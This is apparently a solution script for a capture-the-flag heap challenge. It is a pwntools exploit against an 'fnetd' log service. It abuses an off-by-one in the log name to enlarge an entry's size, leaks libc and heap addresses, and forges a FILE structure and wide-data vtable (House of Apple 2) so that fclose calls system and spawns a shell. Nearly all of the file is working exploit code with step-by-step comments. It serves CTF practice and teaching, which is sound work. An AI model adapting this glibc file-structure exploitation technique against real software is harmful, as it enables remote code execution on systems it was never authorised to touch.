import time
import socket
from pwnlib.util.packing import *
from pwn import *
import os
import sys

#Change this to the actual fnetd password used in the challenge
passw = "fnetd_password"

def read_until(s, token):
    """Reads from socket `s` until a string `token` is found in the response of the server"""
    buf = b""
    while True:
        data = s.recv(2048)
        buf += data
        if not data or token in buf:
            return buf
        
def add_command(s, size, name, content):
    """Sends a command to the server to add a log entry"""
    s.send(b"add\n")
    response = read_until(s, b"Size")
    s.send(size)
    response = read_until(s, b"name")
    s.send(name)
    response = read_until(s, b"content")
    s.send(content)



#This pwn works by first exploiting the rather obvious of by one error add_note() (When entering Log name),
#which allows us to overwrite the LSB of the size of the log entry. This increases the size by up to 0xfe bytes,
#which is more than enough to overwrite the _IO_FILE structure of the log entry. (Which is located just after
#the content_buffer(which has a maximum size of 0x100) on the heap)

#As read_note() relies on the size of the log entry to read the content, we can use this to leak the libc addresses contained
#in the subsequent File struct.

#This solution is based on House of Apple 2(specifically the _IO_wfile_overflow path), which is introduced by roderickchan, which can be found here: https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/

#House of apple 2 exploits the fact, that a files vtable can be overwritten
#However there are protections, to ensure that the vtable is not entirely faked (it has to lie within the _libc_IO_vtables range) (Except if foreign vtable is set appropiately, but this is kinda hard to do as it is protected by pointer_guard)
#This is why we use the _IO_wfile_jumps vtable, which is a legal table instead of the _IO_file_jumps vtable, which is the one that is used by the File struct.
#When we call fclose(fp) on the File struct, this will then eventually call "_IO_FINISH (fp);", which is a macro 
#that eventually will attempt to call _IO_file_finish(fp), from the _IO_file_jumps vtable.

#However, we changed the vtable pointer in such a fashion, that instead _IO_*w*file_overflow is called. 
#This in turn will eventually call _IO_wdoallocbuf (FILE *fp)
#(If flags are set correctly[according to roderick like ~(2 | 0x8 | 0x800), note however that his suggested value for the flags did not work for me and had to be modified], and fp->_wide_data->_IO_write_base == 0)
#As a pointer to flags will end up in rdi(as these are at the beginning of the file struct), we set the flags, so that a shell will be spawned by system (I found "\x01\x01\x01;sh\x00\x00" to work)
#_IO_wdoallocbuf (FILE *fp) in turn will eventually call _IO_WDOALLOCATE (fp), which is a macro, that expands to fs->_wide_data->_wide_vtable->__doallocate(fp), where __doallocate is at _wide_vtable+0x68.
#This requires both a faked _IO_wide_data structure and a faked _IO_wide_vtable structure, which we will craft and deposit in the log entry.
#The constraint for the vtable, is that at _wide_vtable+0x68, the address for 'system' has to be set, so that the call to __doallocate will call system. (We achieve this by setting this as the first value in the log entry, and offsetting the vtable pointer in _wide_data to point to the log entry-0x68 (the other entries will be ignored, as they are not used by the __doallocate function))
#The _IO_wide_data structure will be crafted in such a way, that it contains only NULL pointers, except for _wide_data->_wide_vtable, which will point to
#the faked vtable, as described above.


#This path requires a location where a faked _wide_data + vtable can be placed, thus not being as compact the method introduced by nobodyisnobody, on which our alternative solution is based. 

        
context.update(arch="amd64", os="linux")
#Load libc
current_dir = os.path.dirname(os.path.abspath(__file__))
libc_path = os.path.join(current_dir, "libc-2.36.so")
if not os.path.isfile(libc_path):
    raise FileNotFoundError(f"libc-2.36.so not found in {current_dir}.")
libc = ELF(libc_path, checksec=False)




host = "localhost"
port = 1337

#Take arguments
if len(sys.argv) > 2:
    host = sys.argv[1]
    port = int(sys.argv[2])

s = socket.socket()
s.connect((host, port))
start = read_until(s, b"Pass")
s.send(passw.encode() + b'\n')
response = read_until(s, b"a command")
print(response)

add_command(s, b"256\n", (b"e" * 32 + b"\xfe"), b"testtest content\n")
response = read_until(s, b"a command")


s.send(b"read\n")
response = read_until(s, b"ID")
s.send(b"0\n")
response_with_libc = read_until(s, b"a command")
libc_leak = response_with_libc.split(b"\xe1\x01")[1][6:][104:112] #Manually determined
libc_leak = int.from_bytes(libc_leak.strip(), byteorder='little')
print("libc_leak: ", hex(libc_leak))

libc_base = libc_leak - 0x1D3680 #Manually calculated from libc-2.36.so
print("libc_base: ", hex(libc_base))

heap_leak = response_with_libc.split(b"\xe1\x01")[1][6:][136:144]
print("heap_leak: ", heap_leak)
heap_leak = int.from_bytes(heap_leak.strip(), byteorder='little')
print("heap_leak: ", hex(heap_leak))

#Set libc base address to the calculated base address
libc.address = libc_base

#Adapted House of Apple 2 from https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/

fake_vtable = libc.sym['_IO_wfile_jumps'] + 0x8 #So that _IO_wfile_overflow will be called upon flushing
file_lock = heap_leak + 0x330

#Default file structure, except fake vtable 
fake = FileStructure(0)
fake.flags = b"\x01\x01\x01;sh\x00\x00" #Manuelly determined, as the flag suggested by roderickchan ("  sh;") did not work for me
fake._lock = file_lock
fake._wide_data = heap_leak + 0x140	+ 0x8	# _wide_data, will point to 0x8 in our (2nd word) log entry
fake.vtable = fake_vtable

# print("Fake file structure:")
# print(bytes(fake))
# print("Length of fake: ", len(fake))


#Adapted from https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
#Craft fake _wide_data structure, which we will deposit in the log entry
fake_wide_data = p64(libc.sym['system']) #will be _wide_data-> _wide_vtable->doallocate
#fake_wide_data = p64(libc_base + 0x4c490) #system@libc
fake_wide_data += p64(0) * 4 #_wide_data->_IO_write_baseSet to 0, that satisfies*(A + 0x18) = 0 (this is where wide_data will point to)
fake_wide_data += p64(0) * 3 #_wide_data->_IO_buf_baseSet to 0, that satisfies*(A + 0x30) = 0
fake_wide_data += p64(0) * 21 + p64(heap_leak + 0x140 - 0x68) #_wide_data->_wide_vtable->doallocate Set to address Cfor hijacking RIP, that is,*(B + 0x68) = C
#will point to so that doallocate is at beginning of Log (which we overwrote previously)(pointing to system@libc now)

fake_wide_data += p64(0) * 3 #Fill with 0, so were just before the size of the chunk for the file struct

#Writing the 0x1e1 before the fake file structure is necessery to defeat the anti-hacking check
add_command(s, b"256\n", (b"e" * 32 + b"\xfe"), fake_wide_data + p64(0x1e1) + bytes(fake))

response = read_until(s, b"command")
#print(response)

#Trigger the call to fclose(fp) in delete_note()
s.send(b"delete\n")
response = read_until(s, b"ID")
s.send(b"1\n")
response = read_until(s, b"")

#Give the server some time to spawn the shell
time.sleep(0.1)
s.send(b"get_flag\n")
response = read_until(s, b"")
print(response)










